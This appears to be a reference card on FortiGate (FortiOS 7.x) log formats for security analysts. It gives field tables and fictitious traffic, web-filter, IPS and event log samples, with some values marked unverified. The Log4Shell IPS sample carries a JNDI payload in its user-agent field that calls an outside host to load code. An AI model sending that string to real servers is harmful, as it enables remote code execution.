# Fortinet FortiGate (FortiOS) — traffic, UTM and event logs

Category: Network firewall · Vendor: Fortinet · Product: FortiGate running FortiOS 7.x
Scope: `traffic/forward`, `utm/webfilter`, `utm/ips`, `utm/virus`, `event/system`.

## 1. Official sources

| Source | What it confirmed |
|---|---|
| FortiOS Log Message Reference — *13 - LOG_ID_TRAFFIC_END_FORWARD* — https://docs.fortinet.com/document/fortigate/7.4.4/fortios-log-message-reference/13/13-log-id-traffic-end-forward | logid `0000000013` = forward traffic (session end); field list (`srcip`, `dstip`, `srcport`, `dstport`, `policyid`, `sentbyte`, `rcvdbyte`, `trandisp`, `transip`, `appcat`, `utmaction`, `crscore`…) |
| FortiOS Log Message Reference — *13312 - LOG_ID_WEB_FTGD_CAT_ALLOW* — https://docs.fortinet.com/document/fortigate/7.4.3/fortios-log-message-reference/13312/13312-log-id-web-ftgd-cat-allow | logid `0317013312`, `type=utm subtype=webfilter eventtype=ftgd_allow level=notice` |
| FortiOS Log Message Reference — *FortiGuard web filter categories* — https://docs.fortinet.com/document/fortigate/7.6.0/fortios-log-message-reference/755423/fortiguard-web-filter-categories | `cat` number ↔ name table (26 Malicious websites, 61 Phishing, 86 Spam URLs, 88 Dynamic DNS, 90 Newly observed domain, 91 Newly registered domain, 59 Proxy avoidance, 0 Unrated…) |
| FortiOS Log Reference PDF 7.4.0 — https://fortinetweb.s3.amazonaws.com/docs.fortinet.com/v2/attachments/831b6976-e083-11ed-8e6d-fa163e15d75b/FortiOS_7.4.0_Log_Reference.pdf | Header fields (`date`, `time`, `eventtime`, `tz`, `logid`, `type`, `subtype`, `level`, `vd`) and level names |
| Fortinet Community — forward-traffic `action` values — https://community.fortinet.com/t5/Support-Forum/I-don-t-understand-the-actions-for-the-type-log-LOG-ID-TRAFFIC/m-p/201557 and "Understanding Action='Close', 'Reset', and 'Timeout'" — https://community.fortinet.com/fortigate-3/technical-tip-understanding-action-close-reset-and-timeout-in-fortigate-forward-traffic-logs-212459 | `action` ∈ `accept`, `deny`, `start`, `dns`, `ip-conn`, `close`, `timeout`, `client-rst`, `server-rst` |
| FortiGuard Encyclopedia IPS 51006 — https://fortiguard.fortinet.com/encyclopedia/ips/51006 | Signature `Apache.Log4j.Error.Log.Remote.Code.Execution`, VID 51006 (CVE-2021-44228/45046) |
| elastic/integrations `packages/fortinet_fortigate/data_stream/log/_dev/test/pipeline/test-fortinet*.log` — https://github.com/elastic/integrations/tree/main/packages/fortinet_fortigate/data_stream/log/_dev/test/pipeline | Real RAW lines: quoting rules, `ftgd_blk` (0316013056) / `ftgd_allow` (0317013312), IPS (0419016384) with `attack`/`attackid`/`ref`/`incidentserialno`, virus (0211008192), deny with `crscore=30 craction=131072 crlevel="high"`, event/system 0100032001 |

## 2. Native format & delivery

- **Wire format:** syslog (UDP 514 / TCP / reliable-syslog), FortiAnalyzer forwarding, or FortiCloud. Body = space-separated `key=value` pairs. FortiOS 7.x default header: `date=YYYY-MM-DD time=HH:MM:SS devname="…" devid="…" eventtime=<epoch ns> tz="+0300" logid="…" type="…" subtype="…" level="…" vd="…"`. A syslog PRI (`<189>`) may precede it.
- **Quoting:** strings are double-quoted (`action="close"`, `logid="0000000013"`); integers, IPs and MACs are unquoted (`sessionid=88231407`, `srcip=10.20.14.37`). Fields with no value are simply absent — FortiOS does not emit empty keys.
- `eventtime` is epoch in **nanoseconds** on 7.x (19 digits); older builds emit seconds/µs. `date`/`time` are local to `tz`.
- Optional formats (CEF, CSV) can be configured; this card describes the default.

**Our JSON rendering rule (platform):**
1. Flat object; keys = FortiOS field names exactly, in emitted order.
2. **Quoted value → JSON string; unquoted integer → JSON number; unquoted IP / MAC / date / time → JSON string.** `logid` stays a quoted 10-digit string (leading zeros matter).
3. Never invent empty keys; only keys the log type actually carries.

## 3. Core field reference

### 3.1 Header (all logs)

| Field | Meaning | Values |
|---|---|---|
| `date`, `time` | Local date/time | `2026-09-30`, `09:14:07` |
| `devname`, `devid` | Hostname / serial | `FGT-HQ-01`, `FG200FTK22901234` |
| `eventtime` | Epoch (ns on 7.x) | `1790748847902114551` |
| `tz` | UTC offset | `+0300` |
| `logid` | 10-digit ID = 2-digit type + 2-digit subtype + 6-digit message ID | `0000000013` forward traffic · `0000000020` forward traffic interim (long-lived session) · `0000000011` forward traffic (DNS/other action) · `0317013312` webfilter allow · `0316013056` webfilter block · `0419016384` IPS signature · `0211008192` AV infected · `0100032001` admin login OK · `0100032002` admin login failed |
| `type` | Log type | `traffic`, `utm`, `event` |
| `subtype` | Subtype | traffic: `forward`, `local`, `multicast`, `sniffer` · utm: `webfilter`, `ips`, `virus`, `app-ctrl`, `dns`, `ssl`, `anomaly` · event: `system`, `user`, `vpn`, `router`, `ha`… |
| `level` | Syslog level (word) | `emergency`, `alert`, `critical`, `error`, `warning`, `notice`, `information`, `debug` |
| `vd` | VDOM | `root` |

### 3.2 traffic/forward

| Field | Meaning | Values |
|---|---|---|
| `srcip`, `srcport`, `srcintf`, `srcintfrole`, `srcname`, `srcmac`, `srccountry` | Source side | `srcintfrole` ∈ `lan`, `wan`, `dmz`, `undefined` |
| `dstip`, `dstport`, `dstintf`, `dstintfrole`, `dstcountry` | Destination side | `dstcountry="Reserved"` for RFC1918 |
| `sessionid` | Session ID (join key to UTM logs) | integer |
| `proto` | IP protocol number | `6`, `17`, `1` |
| `action` | Session result | `accept`, `deny`, `close`, `timeout`, `client-rst`, `server-rst`, `start`, `dns`, `ip-conn` |
| `policyid`, `policyname`, `poluuid`, `policytype` | Matched firewall policy | `policyid=0` = implicit deny; `policytype` `policy` / `proxy-policy` |
| `service` | Service object | `HTTPS`, `RDP`, `tcp/8080` |
| `trandisp`, `transip`, `transport` | NAT disposition / translated IP:port | `trandisp` ∈ `snat`, `dnat`, `snat+dnat`, `noop` |
| `app`, `appid`, `appcat`, `apprisk`, `applist`, `appact` | Application Control | `apprisk` ∈ `critical`, `high`, `medium`, `elevated`, `low` |
| `duration`, `sentbyte`, `rcvdbyte`, `sentpkt`, `rcvdpkt` | Counters (sent = from originator) | integers |
| `utmaction`, `countweb`, `countips`, `countav`, `countapp`, `utmref` | Summary of UTM verdicts on the session | `utmaction` ∈ `allow`, `block`, `reset`, … |
| `user`, `group`, `authserver`, `unauthuser` | Identity (FSSO/RSSO/firewall auth) | |
| `crscore`, `craction`, `crlevel` | Client-reputation scoring | `crlevel` ∈ `low`, `medium`, `high`, `critical` |
| `osname`, `srcswversion`, `devtype`, `mastersrcmac` | Device detection | |

### 3.3 utm/webfilter

`eventtype` (`ftgd_allow`, `ftgd_blk`, `urlfilter`, `ftgd_err`…), `hostname`, `url`, `profile`, `action` (`passthrough`, `blocked`, `monitored`… UNVERIFIED full list), `reqtype` (`direct`, `referral`), `referralurl`, `method` (`domain`), `cat` (number), `catdesc` (name), `direction` (`outgoing`/`incoming`), `msg`, `sentbyte`, `rcvdbyte`, plus session 5-tuple and `sessionid`. Example category names as they appear in logs: `Malicious Websites` (26), `Phishing` (61), `Newly Registered Domain` (91), `Newly Observed Domain` (90), `Dynamic DNS` (88), `Proxy Avoidance` (59), `Unrated` (0).

### 3.4 utm/ips

`eventtype` (`signature`, `anomaly`, `botnet`…), `severity` (`info`, `low`, `medium`, `high`, `critical`), `attack` (signature name), `attackid` (VID), `ref` (`http://www.fortinet.com/ids/VID<attackid>`), `incidentserialno`, `profile`, `action` (`dropped`, `detected`, `reset`, `pass_session`… — `dropped`/`detected` confirmed in samples), `direction`, `hostname`, `url`, `msg` (`<group>: <attack>,`), `crscore`/`craction`/`crlevel`.

### 3.5 utm/virus

`eventtype` (`infected`, `filetypeblock`, `outbreak-prevention`…), `virus`, `virusid`, `dtype` (`Virus`), `filename`, `url`, `action` (`blocked`, `monitored`, `passthrough`), `quarskip`, `ref` (`http://www.fortinet.com/ve?vn=<name>`), `analyticscksum` (SHA-256), `analyticssubmit`.

### 3.6 event/system

`logdesc` (human description), `msg`, `user`, `ui` (`https(1.2.3.4)`, `ssh(…)`), `method`, `action` (`login`, `logout`…), `status` (`success`, `failed`), `reason`, `profile`. No `sessionid`/`policyid`.

## 4. Realistic samples

Scenario thread (fictitious): workstation `10.20.14.37` (`WS-FIN-0142`, user `dlevi`, group `Finance`) behind SNAT `203.0.113.10`; DMZ app server `10.30.1.15` published as `203.0.113.25:8080`. External IPs are RFC 5737; domains invented. `eventtime` values are the true epoch-ns of the shown local time (+0300).

### FGT-1 - Web filter lets a newly-registered domain through (C2-like beacon)

utm/webfilter `ftgd_allow` (logid 0317013312). The profile is set to *monitor/allow* category 91 (Newly Registered Domain), so the request passes (`action="passthrough"`) but is logged. Repetition every ~60 s from the same `srcip` to the same `hostname` is the beacon signal.

**Raw (native):**

```text
date=2026-09-30 time=09:14:06 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790748846412377104 tz="+0300" logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" vd="root" policyid=12 poluuid="5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20" policytype="policy" sessionid=88231407 user="dlevi" group="Finance" authserver="ACME-FSSO" srcip=10.20.14.37 srcport=52144 srccountry="Reserved" srcintf="port2" srcintfrole="lan" dstip=198.51.100.77 dstport=443 dstcountry="United States" dstintf="port1" dstintfrole="wan" proto=6 service="HTTPS" hostname="cdn-telemetry-sync.top" profile="Corp-WebFilter" action="passthrough" reqtype="direct" url="https://cdn-telemetry-sync.top/" sentbyte=517 rcvdbyte=0 direction="outgoing" msg="URL belongs to an allowed category in policy" method="domain" cat=91 catdesc="Newly Registered Domain"
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "09:14:06",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790748846412377104,
  "tz": "+0300",
  "logid": "0317013312",
  "type": "utm",
  "subtype": "webfilter",
  "eventtype": "ftgd_allow",
  "level": "notice",
  "vd": "root",
  "policyid": 12,
  "poluuid": "5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20",
  "policytype": "policy",
  "sessionid": 88231407,
  "user": "dlevi",
  "group": "Finance",
  "authserver": "ACME-FSSO",
  "srcip": "10.20.14.37",
  "srcport": 52144,
  "srccountry": "Reserved",
  "srcintf": "port2",
  "srcintfrole": "lan",
  "dstip": "198.51.100.77",
  "dstport": 443,
  "dstcountry": "United States",
  "dstintf": "port1",
  "dstintfrole": "wan",
  "proto": 6,
  "service": "HTTPS",
  "hostname": "cdn-telemetry-sync.top",
  "profile": "Corp-WebFilter",
  "action": "passthrough",
  "reqtype": "direct",
  "url": "https://cdn-telemetry-sync.top/",
  "sentbyte": 517,
  "rcvdbyte": 0,
  "direction": "outgoing",
  "msg": "URL belongs to an allowed category in policy",
  "method": "domain",
  "cat": 91,
  "catdesc": "Newly Registered Domain"
}
```

### FGT-2 - The matching forward-traffic (session end) log

traffic/forward (logid 0000000013) written when the session closes (`action="close"` = normal TCP FIN). Same `sessionid` as FGT-1 - this is how UTM logs are joined to their session. `transip`/`transport` = SNAT public address/port. App name/ID shown are ILLUSTRATIVE of FortiGuard App Control naming.

**Raw (native):**

```text
date=2026-09-30 time=09:14:07 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790748847902114551 tz="+0300" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=10.20.14.37 srcname="WS-FIN-0142" srcport=52144 srcintf="port2" srcintfrole="lan" dstip=198.51.100.77 dstport=443 dstintf="port1" dstintfrole="wan" srccountry="Reserved" dstcountry="United States" sessionid=88231407 proto=6 action="close" policyid=12 policytype="policy" poluuid="5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20" policyname="LAN-to-Internet" user="dlevi" group="Finance" authserver="ACME-FSSO" service="HTTPS" trandisp="snat" transip=203.0.113.10 transport=31877 appid=41540 app="SSL_TLSv1.3" appcat="Network.Service" apprisk="medium" applist="Corp-AppCtrl" duration=1 sentbyte=1322 rcvdbyte=4870 sentpkt=11 rcvdpkt=11 utmaction="allow" countweb=1 countapp=1 osname="Windows" srcswversion="11" mastersrcmac=3c:52:82:4a:19:e7 srcmac=3c:52:82:4a:19:e7 srcserver=0
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "09:14:07",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790748847902114551,
  "tz": "+0300",
  "logid": "0000000013",
  "type": "traffic",
  "subtype": "forward",
  "level": "notice",
  "vd": "root",
  "srcip": "10.20.14.37",
  "srcname": "WS-FIN-0142",
  "srcport": 52144,
  "srcintf": "port2",
  "srcintfrole": "lan",
  "dstip": "198.51.100.77",
  "dstport": 443,
  "dstintf": "port1",
  "dstintfrole": "wan",
  "srccountry": "Reserved",
  "dstcountry": "United States",
  "sessionid": 88231407,
  "proto": 6,
  "action": "close",
  "policyid": 12,
  "policytype": "policy",
  "poluuid": "5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20",
  "policyname": "LAN-to-Internet",
  "user": "dlevi",
  "group": "Finance",
  "authserver": "ACME-FSSO",
  "service": "HTTPS",
  "trandisp": "snat",
  "transip": "203.0.113.10",
  "transport": 31877,
  "appid": 41540,
  "app": "SSL_TLSv1.3",
  "appcat": "Network.Service",
  "apprisk": "medium",
  "applist": "Corp-AppCtrl",
  "duration": 1,
  "sentbyte": 1322,
  "rcvdbyte": 4870,
  "sentpkt": 11,
  "rcvdpkt": 11,
  "utmaction": "allow",
  "countweb": 1,
  "countapp": 1,
  "osname": "Windows",
  "srcswversion": "11",
  "mastersrcmac": "3c:52:82:4a:19:e7",
  "srcmac": "3c:52:82:4a:19:e7",
  "srcserver": 0
}
```

### FGT-3 - Connection blocked by policy (inbound RDP probe)

traffic/forward, `action="deny"`. A deny is still logid 0000000013 - the verdict lives in `action`, not in the logid. `policyid` is the explicit deny rule (the implicit deny is `policyid=0`). Client-reputation fields `crscore`/`craction`/`crlevel` are added by FortiOS to denied traffic.

**Raw (native):**

```text
date=2026-09-30 time=09:32:51 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790749971640552019 tz="+0300" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=192.0.2.45 srcport=61022 srcintf="port1" srcintfrole="wan" dstip=203.0.113.25 dstport=3389 dstintf="port3" dstintfrole="dmz" srccountry="Netherlands" dstcountry="Reserved" sessionid=88302215 proto=6 action="deny" policyid=99 policytype="policy" poluuid="7a9e3c52-2f3d-51ef-4b1d-8c0a6e2f9d13" policyname="Block-Inbound-Any" service="RDP" trandisp="noop" duration=0 sentbyte=0 rcvdbyte=0 sentpkt=0 rcvdpkt=0 appcat="unscanned" crscore=30 craction=131072 crlevel="high"
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "09:32:51",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790749971640552019,
  "tz": "+0300",
  "logid": "0000000013",
  "type": "traffic",
  "subtype": "forward",
  "level": "notice",
  "vd": "root",
  "srcip": "192.0.2.45",
  "srcport": 61022,
  "srcintf": "port1",
  "srcintfrole": "wan",
  "dstip": "203.0.113.25",
  "dstport": 3389,
  "dstintf": "port3",
  "dstintfrole": "dmz",
  "srccountry": "Netherlands",
  "dstcountry": "Reserved",
  "sessionid": 88302215,
  "proto": 6,
  "action": "deny",
  "policyid": 99,
  "policytype": "policy",
  "poluuid": "7a9e3c52-2f3d-51ef-4b1d-8c0a6e2f9d13",
  "policyname": "Block-Inbound-Any",
  "service": "RDP",
  "trandisp": "noop",
  "duration": 0,
  "sentbyte": 0,
  "rcvdbyte": 0,
  "sentpkt": 0,
  "rcvdpkt": 0,
  "appcat": "unscanned",
  "crscore": 30,
  "craction": 131072,
  "crlevel": "high"
}
```

### FGT-4 - IPS: Log4Shell exploit attempt against a DMZ server (dropped)

utm/ips `signature` (logid 0419016384). Signature name and `attackid` 51006 are the real FortiGuard IPS entry for CVE-2021-44228. Here the destination is already the post-DNAT server IP (the IPS engine sees the translated session). `direction="outgoing"` = client-to-server request. The `msg` group prefix (`applications3:`) and `httpmethod` presence are UNVERIFIED for this signature.

**Raw (native):**

```text
date=2026-09-30 time=10:02:18 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790751738233871460 tz="+0300" logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" vd="root" severity="critical" srcip=192.0.2.88 srccountry="Germany" dstip=10.30.1.15 dstcountry="Reserved" srcintf="port1" srcintfrole="wan" dstintf="port3" dstintfrole="dmz" sessionid=88411903 action="dropped" proto=6 service="tcp/8080" policyid=31 poluuid="91b7c0de-2f3d-51ef-6e0a-1f5c8d3b7a44" policytype="policy" attack="Apache.Log4j.Error.Log.Remote.Code.Execution" srcport=44810 dstport=8080 hostname="portal.acme-corp.example" url="/api/login" agent="${jndi:ldap://192.0.2.88:1389/Exploit}" httpmethod="POST" direction="outgoing" attackid=51006 profile="DMZ-Strict-IPS" ref="http://www.fortinet.com/ids/VID51006" incidentserialno=157702318 msg="applications3: Apache.Log4j.Error.Log.Remote.Code.Execution," crscore=50 craction=4096 crlevel="critical"
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "10:02:18",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790751738233871460,
  "tz": "+0300",
  "logid": "0419016384",
  "type": "utm",
  "subtype": "ips",
  "eventtype": "signature",
  "level": "alert",
  "vd": "root",
  "severity": "critical",
  "srcip": "192.0.2.88",
  "srccountry": "Germany",
  "dstip": "10.30.1.15",
  "dstcountry": "Reserved",
  "srcintf": "port1",
  "srcintfrole": "wan",
  "dstintf": "port3",
  "dstintfrole": "dmz",
  "sessionid": 88411903,
  "action": "dropped",
  "proto": 6,
  "service": "tcp/8080",
  "policyid": 31,
  "poluuid": "91b7c0de-2f3d-51ef-6e0a-1f5c8d3b7a44",
  "policytype": "policy",
  "attack": "Apache.Log4j.Error.Log.Remote.Code.Execution",
  "srcport": 44810,
  "dstport": 8080,
  "hostname": "portal.acme-corp.example",
  "url": "/api/login",
  "agent": "${jndi:ldap://192.0.2.88:1389/Exploit}",
  "httpmethod": "POST",
  "direction": "outgoing",
  "attackid": 51006,
  "profile": "DMZ-Strict-IPS",
  "ref": "http://www.fortinet.com/ids/VID51006",
  "incidentserialno": 157702318,
  "msg": "applications3: Apache.Log4j.Error.Log.Remote.Code.Execution,",
  "crscore": 50,
  "craction": 4096,
  "crlevel": "critical"
}
```

### FGT-5 - Web filter block (Malicious Websites, cat 26)

utm/webfilter `ftgd_blk` (logid 0316013056), `action="blocked"`. `cat` is the FortiGuard numeric category, `catdesc` its name. `reqtype="referral"` + `referralurl` show the click came from another page (here a mail-preview link).

**Raw (native):**

```text
date=2026-09-30 time=10:47:33 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790754453905310772 tz="+0300" logid="0316013056" type="utm" subtype="webfilter" eventtype="ftgd_blk" level="warning" vd="root" policyid=12 poluuid="5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20" policytype="policy" sessionid=88577120 user="dlevi" group="Finance" authserver="ACME-FSSO" srcip=10.20.14.37 srcport=53017 srccountry="Reserved" srcintf="port2" srcintfrole="lan" dstip=198.51.100.140 dstport=80 dstcountry="Russian Federation" dstintf="port1" dstintfrole="wan" proto=6 service="HTTP" hostname="invoice-docs-share.xyz" profile="Corp-WebFilter" action="blocked" reqtype="referral" url="http://invoice-docs-share.xyz/dl/Invoice_8841.zip" referralurl="http://mail-attach-preview.example/view?id=88413" sentbyte=438 rcvdbyte=0 direction="outgoing" msg="URL belongs to a denied category in policy" method="domain" cat=26 catdesc="Malicious Websites" crscore=30 craction=4194304 crlevel="high"
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "10:47:33",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790754453905310772,
  "tz": "+0300",
  "logid": "0316013056",
  "type": "utm",
  "subtype": "webfilter",
  "eventtype": "ftgd_blk",
  "level": "warning",
  "vd": "root",
  "policyid": 12,
  "poluuid": "5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20",
  "policytype": "policy",
  "sessionid": 88577120,
  "user": "dlevi",
  "group": "Finance",
  "authserver": "ACME-FSSO",
  "srcip": "10.20.14.37",
  "srcport": 53017,
  "srccountry": "Reserved",
  "srcintf": "port2",
  "srcintfrole": "lan",
  "dstip": "198.51.100.140",
  "dstport": 80,
  "dstcountry": "Russian Federation",
  "dstintf": "port1",
  "dstintfrole": "wan",
  "proto": 6,
  "service": "HTTP",
  "hostname": "invoice-docs-share.xyz",
  "profile": "Corp-WebFilter",
  "action": "blocked",
  "reqtype": "referral",
  "url": "http://invoice-docs-share.xyz/dl/Invoice_8841.zip",
  "referralurl": "http://mail-attach-preview.example/view?id=88413",
  "sentbyte": 438,
  "rcvdbyte": 0,
  "direction": "outgoing",
  "msg": "URL belongs to a denied category in policy",
  "method": "domain",
  "cat": 26,
  "catdesc": "Malicious Websites",
  "crscore": 30,
  "craction": 4194304,
  "crlevel": "high"
}
```

### FGT-6 - Large outbound transfer to cloud storage (exfil-like)

traffic/forward session-end. 4.83 GB `sentbyte` vs 51 MB `rcvdbyte` over 2,712 s. For long sessions FortiOS can also write interim logs (logid 0000000020, `action="accept"`) before this final one - sum per `sessionid`, do not double-count. App ID number is ILLUSTRATIVE.

**Raw (native):**

```text
date=2026-09-30 time=11:39:02 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790757542118640225 tz="+0300" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=10.20.14.37 srcname="WS-FIN-0142" srcport=53466 srcintf="port2" srcintfrole="lan" dstip=198.51.100.201 dstport=443 dstintf="port1" dstintfrole="wan" srccountry="Reserved" dstcountry="New Zealand" sessionid=88590417 proto=6 action="close" policyid=12 policytype="policy" poluuid="5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20" policyname="LAN-to-Internet" user="dlevi" group="Finance" authserver="ACME-FSSO" service="HTTPS" trandisp="snat" transip=203.0.113.10 transport=18233 appid=32015 app="MEGA" appcat="Storage.Backup" apprisk="elevated" applist="Corp-AppCtrl" duration=2712 sentbyte=4831203118 rcvdbyte=51388220 sentpkt=3302114 rcvdpkt=609161 utmaction="allow" countapp=1 osname="Windows" srcswversion="11" mastersrcmac=3c:52:82:4a:19:e7 srcmac=3c:52:82:4a:19:e7 srcserver=0
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "11:39:02",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790757542118640225,
  "tz": "+0300",
  "logid": "0000000013",
  "type": "traffic",
  "subtype": "forward",
  "level": "notice",
  "vd": "root",
  "srcip": "10.20.14.37",
  "srcname": "WS-FIN-0142",
  "srcport": 53466,
  "srcintf": "port2",
  "srcintfrole": "lan",
  "dstip": "198.51.100.201",
  "dstport": 443,
  "dstintf": "port1",
  "dstintfrole": "wan",
  "srccountry": "Reserved",
  "dstcountry": "New Zealand",
  "sessionid": 88590417,
  "proto": 6,
  "action": "close",
  "policyid": 12,
  "policytype": "policy",
  "poluuid": "5c0e7b1a-2f3d-51ef-8a6c-3d9b1e4f7a20",
  "policyname": "LAN-to-Internet",
  "user": "dlevi",
  "group": "Finance",
  "authserver": "ACME-FSSO",
  "service": "HTTPS",
  "trandisp": "snat",
  "transip": "203.0.113.10",
  "transport": 18233,
  "appid": 32015,
  "app": "MEGA",
  "appcat": "Storage.Backup",
  "apprisk": "elevated",
  "applist": "Corp-AppCtrl",
  "duration": 2712,
  "sentbyte": 4831203118,
  "rcvdbyte": 51388220,
  "sentpkt": 3302114,
  "rcvdpkt": 609161,
  "utmaction": "allow",
  "countapp": 1,
  "osname": "Windows",
  "srcswversion": "11",
  "mastersrcmac": "3c:52:82:4a:19:e7",
  "srcmac": "3c:52:82:4a:19:e7",
  "srcserver": 0
}
```

### FGT-7 - Event/system: failed admin login on the management interface

event/system (logid 0100032002, "Admin login failed"). Not session traffic: no `sessionid`, no `policyid`. `ui` encodes channel + source. The `reason` value and exact `msg` wording are UNVERIFIED (constructed from the documented pattern of the success message 0100032001).

**Raw (native):**

```text
date=2026-09-30 time=11:52:40 devname="FGT-HQ-01" devid="FG200FTK22901234" eventtime=1790758360551200871 tz="+0300" logid="0100032002" type="event" subtype="system" level="alert" vd="root" logdesc="Admin login failed" sn="0" user="admin" ui="https(192.0.2.45)" method="https" srcip=192.0.2.45 dstip=203.0.113.1 action="login" status="failed" reason="passwd_invalid" msg="Administrator admin login failed from https(192.0.2.45) because of invalid password"
```

**Flat JSON rendering:**

```json
{
  "date": "2026-09-30",
  "time": "11:52:40",
  "devname": "FGT-HQ-01",
  "devid": "FG200FTK22901234",
  "eventtime": 1790758360551200871,
  "tz": "+0300",
  "logid": "0100032002",
  "type": "event",
  "subtype": "system",
  "level": "alert",
  "vd": "root",
  "logdesc": "Admin login failed",
  "sn": "0",
  "user": "admin",
  "ui": "https(192.0.2.45)",
  "method": "https",
  "srcip": "192.0.2.45",
  "dstip": "203.0.113.1",
  "action": "login",
  "status": "failed",
  "reason": "passwd_invalid",
  "msg": "Administrator admin login failed from https(192.0.2.45) because of invalid password"
}
```


## 5. Investigation notes

- **Join key:** `sessionid` links every UTM log (webfilter/ips/virus/app-ctrl) to its `traffic/forward` record. The forward record's `utmaction` + `countweb`/`countips`/`countav` tell you which UTM logs to expect.
- **Pivot fields:** `srcip`/`srcname`/`user` → `dstip`/`hostname`/`url` → `policyid`/`policyname` → `transip` (public egress for TI matching).
- **Verdict lives in `action`, not in `logid`:** forward traffic accept, deny and close all use `0000000013`; webfilter allow/block differ in logid *and* `action`.
- **Long sessions:** with "log all sessions" you may get interim `0000000020` (`action="accept"`) records before the final `close`; aggregate per `sessionid` and take the final counters.
- **Beaconing:** repeated `ftgd_allow` for the same `hostname` with `cat=91`/`90`/`0` at a fixed interval; matching forward logs with near-identical `sentbyte`.
- **Exfil:** large `sentbyte` vs `rcvdbyte` with `app`/`appcat` in storage/file-sharing; check `duration` and the time of day.
- **Console view:** Log & Report → Forward Traffic / Security Events (Web Filter, Intrusion Prevention, AntiVirus) / System Events; FortiAnalyzer Log View uses the same field names in filters (`srcip==10.20.14.37 and sessionid==88231407`).

## 6. Common mistakes / fields that do NOT exist in FortiGate logs

- No `src` / `dst` / `sport` / `dport` / `bytes_sent` / `rule` / `from` / `to` / `natsrc` / `threatid` — those are **Palo Alto**.
- No `rule_name` / `rule_uid` / `xlatesrc` / `s_port` / `service_id` / `inzone` / `loguid` / `origin` / `product` — those are **Check Point**.
- No `SrcIP` / `AccessControlRuleAction` / `InitiatorBytes` — **Cisco FTD**.
- No `data.` prefix, no `rule.level`/`rule.description`/`agent.*`/`decoder.*`/`full_log` — that is a **Wazuh/SIEM envelope**, not FortiOS.
- `logid` is a quoted 10-digit string (`"0000000013"`), not the integer `13`.
- There is no `action="allow"` in traffic logs (use `accept` / `close`); `allow` appears only in `utmaction`. Webfilter allow is `passthrough`, IPS block is `dropped`, AV block is `blocked`.
- `severity` exists in `utm/ips` (and some others) — the header uses `level`, not `severity`.
- `direction` (`outgoing`/`incoming`) appears in UTM logs, not in forward-traffic logs.
- `cat`/`catdesc`/`reqtype` belong to the `utm/webfilter` log; the forward-traffic record of the same session only carries the summary (`countweb`, `utmaction`). (Forward logs *may* carry `hostname`/`url` on some builds/profiles — UNVERIFIED as a default, so do not rely on it.)
